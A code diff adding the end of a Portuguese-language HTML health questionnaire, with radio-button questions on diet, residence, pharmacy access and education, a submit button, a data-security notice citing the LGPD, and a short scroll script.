+                  <input type="radio" name="atividadeFisica" value="naoInformar" class="mr-3">
+                  <span>Prefiro não informar</span>
+                </label>
+              </div>
+            </div>
+            
+            <!-- Hábito Alimentar -->
+            <div class="mb-8">
+              <h4 class="font-semibold text-gray-700 mb-3">7. Hábito Alimentar</h4>
+              <div class="space-y-2">
+                <label class="flex items-center">
+                  <input type="radio" name="habitoAlimentar" value="dietaMedica" class="mr-3" required>
+                  <span>Sigo uma dieta recomendada por médico ou nutricionista</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="habitoAlimentar" value="tentaSaudavel" class="mr-3">
+                  <span>Tento comer de forma saudável</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="habitoAlimentar" value="naoEspecifica" class="mr-3">
+                  <span>Não sigo uma dieta específica</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="habitoAlimentar" value="naoInformar" class="mr-3">
+                  <span>Prefiro não informar</span>
+                </label>
+              </div>
+            </div>
+            
+            <!-- Local de Residência -->
+            <div class="mb-8">
+              <h4 class="font-semibold text-gray-700 mb-3">8. Local de Residência</h4>
+              <div class="space-y-2">
+                <label class="flex items-center">
+                  <input type="radio" name="localResidencia" value="urbano" class="mr-3" required>
+                  <span>Urbano (cidade grande ou média)</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="localResidencia" value="rural" class="mr-3">
+                  <span>Rural (interior ou zona rural)</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="localResidencia" value="pequenaCidade" class="mr-3">
+                  <span>Pequena cidade</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="localResidencia" value="naoInformar" class="mr-3">
+                  <span>Prefiro não informar</span>
+                </label>
+              </div>
+            </div>
+            
+            <!-- Acesso a Farmácias ou Postos de Saúde -->
+            <div class="mb-8">
+              <h4 class="font-semibold text-gray-700 mb-3">9. Acesso a Farmácias ou Postos de Saúde</h4>
+              <div class="space-y-2">
+                <label class="flex items-center">
+                  <input type="radio" name="acessoFarmacia" value="facil" class="mr-3" required>
+                  <span>Tenho acesso fácil (perto da minha casa)</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="acessoFarmacia" value="distante" class="mr-3">
+                  <span>Tenho acesso, mas é distante</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="acessoFarmacia" value="dificil" class="mr-3">
+                  <span>Não tenho acesso fácil</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="acessoFarmacia" value="naoInformar" class="mr-3">
+                  <span>Prefiro não informar</span>
+                </label>
+              </div>
+            </div>
+            
+            <!-- Nível de Escolaridade -->
+            <div class="mb-8">
+              <h4 class="font-semibold text-gray-700 mb-3">10. Nível de Escolaridade</h4>
+              <div class="space-y-2">
+                <label class="flex items-center">
+                  <input type="radio" name="escolaridade" value="fundamental" class="mr-3" required>
+                  <span>Ensino fundamental ou menos</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="escolaridade" value="medio" class="mr-3">
+                  <span>Ensino médio</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="escolaridade" value="superior" class="mr-3">
+                  <span>Ensino superior</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="escolaridade" value="naoEstudou" class="mr-3">
+                  <span>Não estudei</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="escolaridade" value="naoInformar" class="mr-3">
+                  <span>Prefiro não informar</span>
+                </label>
+              </div>
+            </div>
+            
+            <!-- Botão de envio e mensagem de processamento -->
+            <div class="mt-8">
+              <button type="submit" id="submitHealthButton" class="confirm-button w-full">
+                <i class="fas fa-check-circle mr-2"></i> Finalizar e Prosseguir
+              </button>
+              <div id="healthFormLoader" class="loader mt-4 hidden"></div>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+    
+    <div class="bg-white p-4 rounded-lg shadow-sm mt-6">
+      <p class="font-bold text-gray-700 text-base mb-2">
+        <i class="fas fa-shield-alt text-green-600 mr-2"></i>
+        Sistema de Verificação Segura
+      </p>
+      <p class="text-gray-700 text-sm">
+        A verificação de identidade é realizada utilizando conexão criptografada e todos os seus dados são processados com os mais altos padrões de segurança em conformidade com a Lei Geral de Proteção de Dados (LGPD).
+      </p>
+    </div>
+  </main>
+  
+  <div class="w-full mt-6">
+    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
+  </div>
+  
+  <a href="#" class="vlibras-icon">
+    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras" class="w-10 h-10">
+  </a>
+  
+  <script>
+    window.addEventListener('scroll', function() {
+      var header = document.querySelector('.sticky-header');
+      if (window.pageYOffset > 0) {
+        header.classList.add('shadow');
+      } else {
+        header.classList.remove('shadow');
+      }
+    });
+  </script>
+</body>
+</html>
